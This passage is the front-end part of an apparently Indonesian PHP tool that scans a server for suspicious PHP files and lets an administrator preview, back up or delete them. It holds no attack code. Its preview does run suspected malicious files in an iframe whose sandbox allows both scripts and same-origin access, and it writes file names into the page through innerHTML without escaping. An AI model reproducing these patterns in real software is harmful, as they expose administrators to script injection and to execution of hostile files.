                                                    ): ?>
                                                        <button class="btn btn-info btn-sm" onclick="showIframe(<?php echo $index; ?>)">
                                                            <i class="fas fa-play"></i> Tampilkan
                                                        </button>
                                                        <button class="btn btn-sm" onclick="hideIframe(<?php echo $index; ?>)" style="background: #6c757d; color: white;">
                                                            <i class="fas fa-stop"></i> Sembunyikan
                                                        </button>
                                                    <?php endif; ?>
                                                </div>
                                            </div>
                                            
                                            <div class="preview-container">
                                                <div class="iframe-overlay" id="overlay-<?php echo $index; ?>">
                                                    <div class="overlay-icon">
                                                        <i class="fas fa-exclamation-triangle"></i>
                                                    </div>
                                                    <div class="overlay-text">
                                                        <h4>Preview Dinonaktifkan</h4>
                                                        <p>File ini mungkin berisi kode berbahaya.</p>
                                                        <p>Klik "Tampilkan" untuk melihat preview web.</p>
                                                    </div>
                                                </div>
                                                
                                                <?php if (
                                                    !empty($file["web_url"])
                                                ): ?>
                                                    <iframe 
                                                        id="iframe-<?php echo $index; ?>" 
                                                        src="about:blank"
                                                        sandbox="allow-same-origin allow-scripts allow-forms"
                                                        loading="lazy"
                                                    ></iframe>
                                                <?php else: ?>
                                                    <div class="iframe-overlay">
                                                        <div class="overlay-icon">
                                                            <i class="fas fa-unlink"></i>
                                                        </div>
                                                        <div class="overlay-text">
                                                            <h4>URL Tidak Tersedia</h4>
                                                            <p>File tidak dapat diakses via web server.</p>
                                                        </div>
                                                    </div>
                                                <?php endif; ?>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Issues List -->
                                    <div class="issues-list">
                                        <div class="issues-title">
                                            <i class="fas fa-exclamation-circle"></i> Daftar Masalah (<?php echo $file[
                                                "issue_count"
                                            ]; ?>)
                                        </div>
                                        <?php foreach (
                                            $file["issues"]
                                            as $issue
                                        ): ?>
                                            <div class="issue-item">
                                                <div class="issue-header">
                                                    <div class="issue-desc">
                                                        <i class="fas fa-exclamation-triangle"></i>
                                                        <?php echo htmlspecialchars(
                                                            $issue[
                                                                "description"
                                                            ]
                                                        ); ?>
                                                    </div>
                                                    <div class="issue-line">Baris <?php echo $issue[
                                                        "line"
                                                    ]; ?></div>
                                                </div>
                                                <div class="issue-code">
                                                    <?php echo htmlspecialchars(
                                                        $issue["code"]
                                                    ); ?>
                                                </div>
                                            </div>
                                        <?php endforeach; ?>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                <?php endif; ?>
            <?php elseif (isset($_POST["scan_path"])): ?>
                <!-- No Results -->
                <div class="section-header">
                    <h2><i class="fas fa-search"></i> Hasil Scanning</h2>
                </div>
                <div class="alert alert-warning">
                    <div class="alert-icon">
                        <i class="fas fa-info-circle"></i>
                    </div>
                    <div>
                        <h4>Tidak Ada Hasil</h4>
                        <p>Path yang dimasukkan tidak valid atau tidak ada file PHP yang mencurigakan.</p>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </div>
    
    <!-- Delete Confirmation Modal -->
    <div class="modal" id="deleteModal">
        <div class="modal-content">
            <h3 class="modal-title">
                <i class="fas fa-exclamation-triangle"></i> Konfirmasi Hapus
            </h3>
            <p id="deleteMessage">Anda yakin ingin menghapus file ini?</p>
            <div class="modal-buttons">
                <button class="btn" onclick="closeModal()" style="background: #6c757d; color: white;">
                    <i class="fas fa-times"></i> Batal
                </button>
                <button class="btn btn-danger" id="confirmDeleteBtn">
                    <i class="fas fa-trash-alt"></i> Ya, Hapus
                </button>
            </div>
        </div>
    </div>
    
    <script>
        // Form submission
        document.getElementById('scanForm').addEventListener('submit', function(e) {
            document.getElementById('loading').style.display = 'block';
            document.getElementById('resultsSection').style.display = 'none';
        });
        
        // Selection management
        let selectedFiles = new Set();
        let currentFileToDelete = '';
        let currentFileIndex = null;
        
        function updateSelection() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            selectedFiles = new Set(Array.from(checkboxes).map(cb => cb.value));
            
            const selectedCount = selectedFiles.size;
            const bulkActions = document.getElementById('bulkActions');
            const selectedCountSpan = document.getElementById('selectedCount');
            
            if (selectedCount > 0) {
                bulkActions.style.display = 'flex';
                selectedCountSpan.textContent = selectedCount + ' file dipilih';
            } else {
                bulkActions.style.display = 'none';
            }
            
            // Update select all checkbox
            const totalCheckboxes = document.querySelectorAll('.file-checkbox').length;
            const selectAll = document.getElementById('selectAll');
            selectAll.checked = selectedCount === totalCheckboxes && totalCheckboxes > 0;
        }
        
        function toggleSelectAll() {
            const selectAll = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('.file-checkbox');
            
            checkboxes.forEach(cb => {
                cb.checked = selectAll.checked;
            });
            
            updateSelection();
        }
        
        // Iframe functions
        function showIframe(index) {
            const iframe = document.getElementById('iframe-' + index);
            const overlay = document.getElementById('overlay-' + index);
            
            if (iframe && overlay) {
                // Ambil URL dari link
                const urlLink = document.querySelector(`#file-${index} .url-link`);
                if (urlLink) {
                    const url = urlLink.href;
                    iframe.src = url;
                    overlay.classList.add('hidden');
                }
            }
        }
        
        function hideIframe(index) {
            const iframe = document.getElementById('iframe-' + index);
            const overlay = document.getElementById('overlay-' + index);
            
            if (iframe && overlay) {
                iframe.src = 'about:blank';
                overlay.classList.remove('hidden');
            }
        }
        
        // Open in new tab
        function openInNewTab(url) {
            window.open(url, '_blank');
        }
        
        // Delete functions
        function confirmDelete(filePath, fileName, fileIndex) {
            currentFileToDelete = filePath;
            currentFileIndex = fileIndex;
            document.getElementById('deleteMessage').innerHTML = 
                'Hapus file: <strong>' + fileName + '</strong>?';
            document.getElementById('deleteModal').style.display = 'flex';
        }
        
        function closeModal() {
            document.getElementById('deleteModal').style.display = 'none';
            currentFileToDelete = '';
            currentFileIndex = null;
        }
        
        // Delete single file
        document.getElementById('confirmDeleteBtn').addEventListener('click', function() {
            if (!currentFileToDelete) return;
            
            const btn = this;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Menghapus...';
            btn.disabled = true;
            
            fetch('?action=delete&file=' + encodeURIComponent(currentFileToDelete))
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert('✅ ' + data.message);
                        removeFileCard(currentFileIndex);
                    } else {
                        alert('❌ ' + data.message);
                    }
                })
                .catch(error => {
                    alert('❌ Error: ' + error.message);
                })
                .finally(() => {
                    btn.innerHTML = '<i class="fas fa-trash-alt"></i> Ya, Hapus';
                    btn.disabled = false;
                    closeModal();
                });
        });
        
        // Delete multiple files
        function deleteSelectedFiles() {
            if (selectedFiles.size === 0) return;
            
            if (!confirm('Hapus ' + selectedFiles.size + ' file yang dipilih?')) return;
            
            const formData = new FormData();
            formData.append('action', 'delete_multiple');
            selectedFiles.forEach(file => {
                formData.append('selected_files[]', file);
            });
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('✅ ' + data.message);
                    location.reload();
                } else {
                    alert('❌ ' + data.message);
                }
            })
            .catch(error => {
                alert('❌ Error: ' + error.message);
            });
        }
        
        // Backup file
        function backupFile(filePath, fileIndex) {
            if (!confirm('Buat backup file ini?')) return;
            
            const btn = document.querySelector(`#file-${fileIndex} .btn-warning`);
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
            btn.disabled = true;
            
            fetch('?action=backup&file=' + encodeURIComponent(filePath))
                .then(response => response.json())
                .then(data => {
                    alert(data.success ? '✅ ' + data.message : '❌ ' + data.message);
                })
                .catch(error => {
                    alert('❌ Error: ' + error.message);
                })
                .finally(() => {
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                });
        }
        
        // Remove file card from display
        function removeFileCard(index) {
            const fileCard = document.getElementById('file-' + index);
            if (fileCard) {
                fileCard.style.transition = 'all 0.3s';
                fileCard.style.opacity = '0';
                fileCard.style.height = '0';
                fileCard.style.margin = '0';
                fileCard.style.padding = '0';
                fileCard.style.overflow = 'hidden';
                
                setTimeout(() => {
                    fileCard.remove();
                    const remainingFiles = document.querySelectorAll('.file-card').length;
                    if (remainingFiles === 0) {
                        location.reload();
                    }
                }, 300);
            }
        }
        
        // Close modal when clicking outside
        window.addEventListener('click', function(e) {
            const modal = document.getElementById('deleteModal');
            if (e.target === modal) {
                closeModal();
            }
        });
        
        // Show results when page loads
        <?php if (
            $scanResults &&
            !isset($scanResults["error"]) &&
            !empty($scanResults["suspect_files"])
        ): ?>
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('resultsSection').style.display = 'block';
            updateSelection();
        });
        <?php endif; ?>
    </script>
</body>
